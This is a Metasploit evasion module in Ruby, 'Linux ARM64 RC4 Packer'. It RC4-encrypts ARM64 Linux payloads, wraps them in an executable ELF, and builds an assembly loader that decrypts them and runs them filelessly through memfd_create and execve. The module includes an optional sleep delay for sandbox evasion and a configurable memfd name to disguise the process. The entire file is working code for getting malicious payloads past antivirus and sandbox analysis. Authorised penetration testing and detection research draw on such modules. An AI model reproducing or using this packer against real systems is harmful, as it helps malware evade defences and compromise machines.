##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Linux ARM64 RC4 Packer',
        'Description'    => %q{
          This evasion module packs ARM64 Linux payloads using RC4 encryption
          and executes them from memory using memfd_create for fileless execution.
          
          The module wraps raw shellcode in a minimal ELF wrapper, encrypts it,
          and embeds it in a loader that decrypts and executes from memory.
          
          Features:
          - RC4 encryption with configurable key size
          - Optional sleep delay for sandbox evasion
          - Fileless execution via memfd_create
        },
        'Author'         => ['Massimo Bertocchi'],
        'License'        => MSF_LICENSE,
        'Platform'       => 'linux',
        'Arch'           => [ARCH_AARCH64],
        'Targets'        => [['Linux ARM64/AArch64', {}]],
        'DefaultTarget'  => 0
      )
    )

    register_options([
      OptString.new('FILENAME', [true, 'Output filename', 'payload.elf']),
      OptInt.new('KEY_SIZE', [true, 'RC4 key size in bytes (1-256)', 32]),
      OptBool.new('RANDOMIZE_KEY', [true, 'Use random RC4 key', true]),
      OptInt.new('SLEEP_SECONDS', [true, 'Sleep duration for timing-based sandbox detection (0=disabled)', 0]),
      OptString.new('MEMFD_NAME', [false, 'Custom memfd process name (empty by default)', ''])
    ])

  end

  def check
    unless Rex::FileUtils.find_full_path('aarch64-linux-gnu-as')
      return CheckCode::Unknown("aarch64-linux-gnu-as not found. Install: apt install binutils-aarch64-linux-gnu")
    end
    
    CheckCode::Safe
  end

  def run
    
    raw_payload = payload.encoded
    unless raw_payload && raw_payload.length > 0
      fail_with(Failure::BadConfig, "Failed to generate payload")
    end

    if raw_payload[0..3] == "\x7fELF"
      elf_payload = raw_payload
    else
      elf_payload = wrap_shellcode_in_elf(raw_payload)
    end
    
    # Validate key size
    key_size = datastore['KEY_SIZE']
    if key_size < 1 || key_size > 256
      fail_with(Failure::BadConfig, "KEY_SIZE must be between 1 and 256")
    end
    
    # Generate RC4 key
    if datastore['RANDOMIZE_KEY']
      key = Rex::Text.rand_text(key_size)
    else
      key = "\x00" * key_size
      print_status("Using null #{key_size}-byte RC4 key")
    end
        
    # Encrypt payload
    encrypted = rc4_crypt(key, elf_payload)
    print_good("Payload encrypted: #{encrypted.length} bytes")
    
    # Verify encryption/decryption
    decrypted_test = rc4_crypt(key, encrypted)
    if decrypted_test == elf_payload
    else
      fail_with(Failure::Unknown, "RC4 encryption verification failed")
    end

    # Build loader
    loader = build_loader(encrypted, key, elf_payload.length)
    
    unless loader
      fail_with(Failure::Unknown, "Failed to build loader")
    end
    

    filename = datastore['FILENAME']
    File.binwrite(filename, loader)
    File.chmod(0755, filename)

    print_good("Evasion payload created successfully!")
  end

  # Wrap raw ARM64 shellcode in a minimal ELF structure
  def wrap_shellcode_in_elf(shellcode)
    code_size = shellcode.length
    load_addr = 0x400000
    
    # ELF header (64 bytes)
    elf_header = [
      0x7f, 0x45, 0x4c, 0x46,                   # Magic: ELF
      0x02,                                     # Class: 64-bit
      0x01,                                     # Data: Little-endian
      0x01,                                     # Version: Current
      0x00,                                     # OS/ABI: SYSV
      0x00,                                     # ABI Version
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # Padding
    ].pack('C*')
    
    elf_header += [
      0x02, 0x00,                               # Type: ET_EXEC
      0xb7, 0x00,                               # Machine: EM_AARCH64
      0x01, 0x00, 0x00, 0x00                    # Version
    ].pack('C*')
    
    entry_point = load_addr + 0x78              # After headers
    
    elf_header += [entry_point].pack('Q<')      # Entry point
    elf_header += [0x40].pack('Q<')             # Program header offset
    elf_header += [0].pack('Q<')                # Section header offset
    elf_header += [0].pack('L<')                # Flags
    elf_header += [64].pack('S<')               # ELF header size
    elf_header += [56].pack('S<')               # Program header size
    elf_header += [1].pack('S<')                # Number of program headers
    elf_header += [0, 0, 0].pack('S<S<S<')      # Section header info
    
    # Program header (56 bytes)
    file_size = 0x78 + code_size
    mem_size = file_size + 0x1000              # Extra space for stack/data
    
    program_header = [
      0x01, 0x00, 0x00, 0x00,                   # Type: PT_LOAD
      0x07, 0x00, 0x00, 0x00                    # Flags: PF_R|PF_W|PF_X
    ].pack('C*')
    
    program_header += [0].pack('Q<')           # Offset in file
    program_header += [load_addr].pack('Q<')   # Virtual address
    program_header += [load_addr].pack('Q<')   # Physical address
    program_header += [file_size].pack('Q<')   # Size in file
    program_header += [mem_size].pack('Q<')    # Size in memory
    program_header += [0x1000].pack('Q<')      # Alignment
    
    # Combine
    elf_header + program_header + shellcode
  end

  def build_loader(encrypted_payload, key, original_size)
    temp_dir = '/tmp'
    base = "msf_arm64_#{Rex::Text.rand_text_alphanumeric(8)}"
    
    asm_file = File.join(temp_dir, "#{base}.s")
    obj_file = File.join(temp_dir, "#{base}.o")
    elf_file = File.join(temp_dir, "#{base}.elf")
    
    begin
      asm_content = loader_asm(encrypted_payload, key, original_size)
      File.write(asm_file, asm_content)
      
      cmd = "aarch64-linux-gnu-as -o #{obj_file} #{asm_file} 2>&1"
      output = `#{cmd}`
      
      unless $?.success?
        print_error("Assembly failed:")
        print_error(output)
        return nil
      end
      
      cmd = "aarch64-linux-gnu-ld -o #{elf_file} #{obj_file} 2>&1"
      output = `#{cmd}`
      
      unless $?.success?
        print_error("Linking failed:")
        print_error(output)
        return nil
      end
      
      binary = File.binread(elf_file)
      
      return binary
      
    rescue => e
      print_error("Exception: #{e.message}")
      return nil
    ensure
      [asm_file, obj_file, elf_file].each { |f| File.delete(f) if File.exist?(f) }
    end
  end

  def loader_asm(encrypted_payload, key, original_size)
    key_bytes = key.bytes.map { |b| "0x%02x" % b }.join(', ')
    
    payload_lines = []
    encrypted_payload.bytes.each_slice(16) do |chunk|
      payload_lines << "    .byte #{chunk.map { |b| "0x%02x" % b }.join(', ')}"
    end
    
    sleep_seconds = datastore['SLEEP_SECONDS']
    memfd_name = datastore['MEMFD_NAME'] || ''
    
    # Escape memfd name and convert to bytes
    memfd_name_bytes = if memfd_name.empty?
      ".byte 0"
    else
      safe_name = memfd_name[0..248]
      name_bytes = safe_name.bytes.map { |b| "0x%02x" % b }.join(', ')
      ".byte #{name_bytes}, 0"
    end
    
    asm = <<~ASM
      .text
      .global _start
      
      _start:
    ASM
    
    # Add sleep if configured
    if sleep_seconds > 0
      asm << <<~ASM
          // Sleep for #{sleep_seconds} seconds (sandbox evasion)
          adr x0, timespec
          mov x1, #0
          mov x8, #101                        // sys_nanosleep
          svc #0
          
      ASM
    end
    
    # Allocate memory
    asm << <<~ASM
          // Allocate memory for decrypted payload
          mov x0, #0
          mov x1, ##{original_size}
          mov x2, #7                          // PROT_READ|WRITE|EXEC
          mov x3, #0x22                       // MAP_PRIVATE|ANONYMOUS
          mov x4, #-1
          mov x5, #0
          mov x8, #222                        // sys_mmap
          svc #0
          mov x20, x0                         // Save buffer in x20
          
          // Initialize RC4 S-box
          adr x1, sbox
          mov x2, #0
      init_sbox:
          strb w2, [x1, x2]
          add x2, x2, #1
          cmp x2, #256
          b.ne init_sbox
          
          // KSA (Key Scheduling Algorithm)
          adr x0, key_data
          mov x1, ##{key.length}
          adr x2, sbox
          mov x3, #0
          mov x4, #0
      ksa_loop:
          ldrb w5, [x2, x3]
          add x4, x4, x5
          udiv x6, x3, x1
          msub x6, x6, x1, x3
          ldrb w7, [x0, x6]
          add x4, x4, x7
          and x4, x4, #0xFF
          ldrb w5, [x2, x3]
          ldrb w6, [x2, x4]
          strb w6, [x2, x3]
          strb w5, [x2, x4]
          add x3, x3, #1
          cmp x3, #256
          b.ne ksa_loop
          
          // PRGA (Decrypt)
          adr x0, encrypted_data
          mov x1, x20
          mov x2, ##{encrypted_payload.length}
          adr x3, sbox
          mov x4, #0
          mov x5, #0
          mov x6, #0
      prga_loop:
          add x4, x4, #1
          and x4, x4, #0xFF
          ldrb w7, [x3, x4]
          add x5, x5, x7
          and x5, x5, #0xFF
          ldrb w8, [x3, x5]
          strb w8, [x3, x4]
          strb w7, [x3, x5]
          add x9, x7, x8
          and x9, x9, #0xFF
          ldrb w10, [x3, x9]
          ldrb w11, [x0, x6]
          eor w10, w10, w11
          strb w10, [x1, x6]
          add x6, x6, #1
          cmp x6, x2
          b.ne prga_loop
          
          // Create memfd with custom name
          adr x0, memfd_name
          mov x1, #0
          mov x8, #279                        // sys_memfd_create
          svc #0
          mov x19, x0                         // Save fd in x19
          
          // Write decrypted payload to memfd
          mov x0, x19
          mov x1, x20
          mov x2, ##{original_size}
          mov x8, #64                         // sys_write
          svc #0
          
          // Build /proc/self/fd/<fd> path
          adr x0, proc_path
          mov x1, x19
          bl itoa
          
          // Execute payload from memfd
          adr x0, proc_path
          mov x1, #0                          // argv = NULL
          mov x2, #0                          // envp = NULL
          mov x8, #221                        // sys_execve
          svc #0
          
          // If execve returns, exit with error
          mov x0, #1
          mov x8, #93                         // sys_exit
          svc #0
      
      // Convert fd number to string
      itoa:
          mov x2, #10
          adr x3, fd_buf
          add x3, x3, #19
          strb wzr, [x3]
      itoa_loop:
          sub x3, x3, #1
          udiv x4, x1, x2
          msub x5, x4, x2, x1
          add x5, x5, #48
          strb w5, [x3]
          mov x1, x4
          cbnz x1, itoa_loop
          add x0, x0, #14
      itoa_copy:
          ldrb w1, [x3]
          strb w1, [x0]
          add x3, x3, #1
          add x0, x0, #1
          ldrb w1, [x3]
          cbnz w1, itoa_copy
          ret
      
      .data
      .align 8
      
    ASM
    
    if sleep_seconds > 0
      asm << <<~ASM
        timespec:
            .quad #{sleep_seconds}              // tv_sec
            .quad 0                             // tv_nsec
        
      ASM
    end
    
    asm << <<~ASM
      sbox:
          .zero 256
      
      memfd_name:
          #{memfd_name_bytes}
      
      proc_path:
          .ascii "/proc/self/fd/"
          .zero 20
      
      fd_buf:
          .zero 20
      
      key_data:
          .byte #{key_bytes}
      
      encrypted_data:
#{payload_lines.join("\n")}
    ASM
    
    asm
  end

  def rc4_crypt(key, data)
    s = (0..255).to_a
    j = 0
    
    256.times do |i|
      j = (j + s[i] + key.getbyte(i % key.length)) & 0xFF
      s[i], s[j] = s[j], s[i]
    end
    
    i = j = 0
    result = []
    
    data.each_byte do |byte|
      i = (i + 1) & 0xFF
      j = (j + s[i]) & 0xFF
      s[i], s[j] = s[j], s[i]
      k = s[(s[i] + s[j]) & 0xFF]
      result << (byte ^ k)
    end
    
    result.pack('C*')
  end
end
